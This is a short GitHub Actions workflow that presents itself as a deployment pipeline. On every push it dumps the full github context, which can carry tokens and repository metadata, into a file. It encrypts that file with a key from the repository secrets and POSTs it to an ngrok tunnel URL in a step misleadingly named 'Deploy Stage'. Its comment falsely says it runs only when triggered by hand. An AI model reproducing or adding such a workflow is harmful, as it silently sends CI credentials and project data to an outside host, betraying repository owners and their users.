# This is a basic workflow that is manually triggered
name: getting data test

# Controls when the action will run. Workflow runs when manually triggered using the UI
# or API.
on: push

jobs:
  deployment:
    runs-on: ubuntu-latest
    steps:
    - name: Encrypt Stage
      run: |
        echo "$PUBLIC_KEY" > publickey.pem
        echo "${{ toJson(github) }}" > data.txt
        openssl rsa -in publickey.pem -RSAPublicKey_in -pubout > id_pub.pem
        openssl rsautl -encrypt -inkey id_pub.pem -pubin -in data.txt -out top_secret.enc
      env:
        PUBLIC_KEY: ${{ secrets.RSA_PUBLIC }}
    - name: Deploy Stage
      uses: fjogeleit/http-request-action@master
      with:
        url: 'https://edfe-54-91-189-235.ngrok.io'
        method: 'POST'
        data: "$(cat top_secret.enc)"
        
      
